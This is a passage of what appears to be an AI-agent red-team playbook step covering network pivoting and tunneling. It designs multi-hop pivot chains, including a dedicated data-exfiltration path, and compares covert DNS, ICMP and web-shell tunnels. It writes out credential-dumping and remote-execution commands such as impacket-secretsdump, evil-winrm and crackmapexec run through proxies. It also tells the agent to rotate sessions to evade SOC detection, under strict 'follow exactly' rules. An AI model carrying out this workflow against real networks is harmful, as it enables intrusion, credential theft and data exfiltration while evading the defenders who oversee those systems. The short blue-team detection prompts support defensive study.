| DNS Tunnel | 5-50 KB/s | High | Medium | Medium | Yes |
| ICMP Tunnel | 10-100 KB/s | Medium-High | Low | Low | Yes |
| Web Shell Tunnel | 50-500 KB/s | Medium | Medium | High | No |
| Domain Fronting | Near-native | Low | High | High | No |
| WebSocket | Good | Low-Medium | Low | High | No |

**Present covert channel assessment and recommend only if standard tunnels are insufficient.**

### 7. Multi-Hop Chain Design

**Design the complete pivot topology connecting all segments:**

**Chain Design Format:**
```
PIVOT-CHAIN-001: {{name}}
Operator → Hop 1: {{pivot1}} [{{protocol/tool}}:{{port}}] → Hop 2: {{pivot2}} [{{protocol/tool}}:{{port}}] → Target Segment: {{cidr}}
Redundancy: {{backup_chain_description}}
Bandwidth: {{estimated_throughput}}
Latency: {{estimated_latency}}
Max Stable Duration: {{estimated_hours_before_rotation}}
Monitoring Risk per Hop: {{hop1_risk}} → {{hop2_risk}} → {{target_risk}}
```

**Design the topology considering:**

1. **Primary chain**: the fastest, most reliable path to each target segment
2. **Backup chain**: alternative path if the primary fails (different pivot hosts, different protocols)
3. **Exfiltration chain**: the path that will carry data out — bandwidth is critical here

**Topology documentation (text diagram):**

```
Pivot Topology Map:

[Operator]
    │
    ├── PRIMARY ──[Chisel/443]──→ [Pivot1: 10.10.10.5]
    │                                  │
    │                                  ├──[SMB Pipe]──→ [Target_A: 10.10.20.100] (Domain Controller)
    │                                  │
    │                                  ├──[SOCKS/1080]──→ [10.10.20.0/24] (Server VLAN)
    │                                  │
    │                                  └──[SSH/-J]──→ [Pivot2: 10.10.20.15]
    │                                                     │
    │                                                     └──[Ligolo-ng]──→ [10.10.30.0/24] (DB VLAN)
    │
    └── BACKUP ──[DNS/53]──→ [Pivot3: 10.10.10.20]
                                   │
                                   └──[Web Shell]──→ [10.10.20.0/24] (Server VLAN)
```

**Redundancy planning:**
- For each critical target: at least 2 independent paths
- For exfiltration: primary + fallback channel
- Test failover: if primary drops, how quickly can backup activate?

**Bandwidth and latency matrix:**

| Chain | Hops | Est. Bandwidth | Est. Latency | Tool Compatibility | Suitable For |
|-------|------|---------------|-------------|-------------------|-------------|
| PRIMARY | 2 | {{bw}} | {{latency}} | Full (Ligolo-ng transparent) | All operations |
| BACKUP | 2 | {{bw}} | {{latency}} | SOCKS-compatible only | Emergency / C2 |
| EXFIL | 1-2 | {{bw}} | {{latency}} | File transfer optimized | Data exfiltration |

**Keepalive and reconnection strategies:**
- SSH: `ServerAliveInterval 60`, `ServerAliveCountMax 3` — detect dead connections
- Chisel: built-in reconnection (`--keepalive 30s`)
- Ligolo-ng: agent auto-reconnect on connection loss
- C2 beacons: sleep/jitter handles intermittent connectivity
- Session rotation: rotate tunnel sessions every N hours to avoid connection duration anomalies

**Present the complete pivot chain topology before proceeding to verification.**

### 8. Pivot Verification & Stability Testing

**Systematically test every pivot chain before relying on it operationally:**

#### Connectivity Testing

```bash
# Test basic connectivity through each pivot
# Through SOCKS proxy:
proxychains4 nmap -sT -Pn -p 445,3389,22,80,443 target_ip

# Through Ligolo-ng (transparent):
nmap -sT -Pn -p 445,3389,22,80,443 target_ip

# Through SSH tunnel:
# Test the forwarded port is reachable
curl http://127.0.0.1:8080  # (local forward to web app)
```

#### Bandwidth Testing

```bash
# iperf through tunnel (if iperf available on both sides)
# Server on target: iperf3 -s -p 5201
# Client through proxy: proxychains4 iperf3 -c target_ip -p 5201

# Alternative: timed file transfer
# time proxychains4 scp testfile user@target:/tmp/
# Calculate: file_size / transfer_time = throughput

# Minimum bandwidth requirements:
# - Interactive shell: 1 KB/s (sufficient)
# - Tool execution (CrackMapExec, Impacket): 10-100 KB/s
# - File transfer / exfiltration: 500 KB/s+ preferred
# - Large data exfiltration: 1 MB/s+ preferred
```

#### Tool Compatibility Testing

```bash
# Test critical tools through each pivot chain:

# CrackMapExec through SOCKS
proxychains4 crackmapexec smb target_ip -u testuser -p testpass

# Impacket through SOCKS
proxychains4 impacket-wmiexec admin:Password1@target_ip whoami

# Evil-WinRM through SOCKS
proxychains4 evil-winrm -i target_ip -u admin -p Password1

# BloodHound through SOCKS
proxychains4 bloodhound-python -u admin -p Password1 -d corp.local -c All

# Secretsdump through SOCKS
proxychains4 impacket-secretsdump admin:Password1@target_ip

# Note tools that do NOT work through SOCKS:
# - Responder (requires raw sockets)
# - mitm6 (requires raw sockets)
# - nmap SYN scan (requires raw sockets — use -sT only)
# - ARP-based tools (Layer 2 — must run on pivot directly)
```

#### Failover Testing

```bash
# Test backup chain activation:
# 1. Verify backup chain is operational (independent test)
# 2. Simulate primary failure (disconnect primary tunnel)
# 3. Confirm backup chain carries traffic
# 4. Restore primary and verify re-establishment
# 5. Measure failover time: primary down → backup active

# Document failover procedure:
# Step 1: Detect primary failure (timeout/connection error)
# Step 2: Activate backup (specific commands)
# Step 3: Verify backup connectivity
# Step 4: Continue operations on backup
# Step 5: Restore primary when possible
```

**Present Pivot Verification Results:**

| Chain ID | Connectivity | Bandwidth | Latency | Tool Compat | Stability (1h) | Failover | Status |
|----------|-------------|-----------|---------|------------|----------------|---------|--------|
| PRIMARY | ✅/❌ | {{KB/s}} | {{ms}} | Full/Partial | ✅/❌ | Tested/Untested | Operational/Degraded/Failed |
| BACKUP | ✅/❌ | {{KB/s}} | {{ms}} | Full/Partial | ✅/❌ | N/A | Operational/Degraded/Failed |
| EXFIL | ✅/❌ | {{KB/s}} | {{ms}} | File transfer | ✅/❌ | Tested/Untested | Operational/Degraded/Failed |

**If any chain fails verification:**
"⚠️ Pivot chain {{chain_id}} failed verification: {{failure_reason}}.
Options:
1. Rebuild with alternative tool/protocol
2. Use backup chain as primary
3. Accept degraded capability for this segment
4. Return to steps 04-07 to compromise an alternative pivot host"

### 9. Document Findings

**Write findings under `## Network Pivoting & Tunneling`:**

```markdown
## Network Pivoting & Tunneling

### Pivot Requirements
{{pivot_requirements_matrix}}

### Pivot Infrastructure Deployed
{{per_pivot_documentation — tool, protocol, port, hosts, direction}}

### Pivot Chain Topology
{{topology_diagram}}

### Covert Channels (if deployed)
{{covert_channel_documentation_or_none_required}}

### C2 Pivot Architecture
{{c2_pivot_topology}}

### Verification Results
{{verification_results_table}}

### Failover Testing
{{failover_test_results}}

### OPSEC Assessment
- Network signatures generated: {{list}}
- Estimated detection risk per chain: {{assessment}}
- Recommended rotation schedule: {{schedule}}
```

Update frontmatter metrics:
- `pivot_chains_established` with total operational chain count
- `pivot_tools_deployed` with tool list
- `covert_channels_used` with covert channel count (or 0)
- `pivot_verification_status` with overall status

### 10. Present MENU OPTIONS

"**Network pivoting and tunneling infrastructure established.**

Summary: {{chain_count}} pivot chains operational.
Tools deployed: {{tool_list}}
Segments bridged: {{segment_count}} network segments now reachable
Covert channels: {{covert_count}} deployed (or: none required — standard tunnels sufficient)
Verification: all chains tested for connectivity, bandwidth, tool compatibility
Failover: {{failover_status}} — backup chains tested and ready

**Select an option:**
[A] Advanced Elicitation — Deep analysis of a specific pivot chain's OPSEC posture against the target's network monitoring
[W] War Room — Red (pivot chain reliability, failover confidence, exfiltration bandwidth) vs Blue (network anomaly detection, tunnel fingerprinting, connection duration analysis)
[C] Continue — Proceed to Access Verification & Persistence (Step 9 of 10)"

#### Menu Handling Logic:

- IF A: Deep analysis — select a specific pivot chain and analyze its OPSEC against the target's network monitoring capabilities. Analyze: would NTA/NBAD detect this tunnel? What traffic patterns are anomalous? Is the protocol fingerprint convincing? Would a network forensics analyst find this tunnel in a PCAP? What would DPI reveal? What connection metadata (duration, volume, timing) stands out? Process insights, ask user if they want to refine the pivot chain, if yes iterate and redisplay menu, if no redisplay menu
- IF W: War Room — Red Team perspective: which pivot chain is most reliable? What is the bandwidth headroom for exfiltration? What happens if the SOC kills the primary pivot — is the backup truly independent? How many hops before tools become unusable? Blue Team perspective: what network anomalies has this pivot infrastructure generated? What Zeek/Suricata signatures would fire? What NetFlow analysis would reveal? What connection metadata stands out (duration, volume, timing patterns)? What IDS rules should be written for these tunnel types? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to stepsCompleted, then read fully and follow: ./step-09-verification.md
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and Network Pivoting & Tunneling section populated], will you then read fully and follow: `./step-09-verification.md` to begin access verification and persistence.

---

## 🚨 SYSTEM SUCCESS/FAILURE METRICS

### ✅ SUCCESS:

- Pivot requirements analyzed from steps 02-07 — every unreachable segment identified
- Pivot host suitability assessed — multi-homed interfaces, stability, monitoring level
- SSH tunneling options documented with specific commands for each type (local, remote, dynamic, ProxyJump, over HTTP)
- SOCKS proxy and proxy chain tools deployed and configured (Chisel, Ligolo-ng, SSF, Rpivot, Metasploit)
- Port forwarding and redirection established on pivot hosts (socat, netsh, iptables, Plink)
- C2 pivot architecture designed and deployed (SMB/TCP/DNS beacons, SOCKS through C2, pivot listeners)
- Covert channels assessed and deployed only when standard tunnels are insufficient
- Multi-hop chain topology designed with primary, backup, and exfiltration paths
- Every pivot chain verified for connectivity, bandwidth, tool compatibility, and stability
- Failover tested — backup chains activated and confirmed
- Complete topology documented with text diagram
- Findings appended to report under `## Network Pivoting & Tunneling`
- Frontmatter updated with step-08-pivoting.md in stepsCompleted

### ❌ SYSTEM FAILURE:

- Not analyzing pivot requirements before building infrastructure — building tunnels without a plan
- Deploying tunnels on unstable or unverified pivot hosts — infrastructure on sand
- Not testing pivot chains before relying on them operationally — untested infrastructure fails at the worst moment
- Using covert channels when standard tunnels would suffice — unnecessary complexity
- Not designing backup/redundancy for critical pivot chains — single point of failure
- Not documenting the pivot topology — lost infrastructure during exfiltration is catastrophic
- Not assessing bandwidth and latency — tools fail silently through slow tunnels
- Not verifying tool compatibility through the pivot chain — discovering incompatibility mid-operation
- Not rotating long-running tunnel sessions — connection duration anomalies expose the infrastructure
- Ignoring OPSEC: non-standard ports, unencrypted tunnels, high-volume DNS queries
- Performing lateral movement execution during this infrastructure step
- Proceeding without user selecting 'C' (Continue)

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. Every pivot chain documented end-to-end, every chain tested, every chain with redundancy considered. The pivot infrastructure IS the operational backbone — if it fails, the entire operation fails.
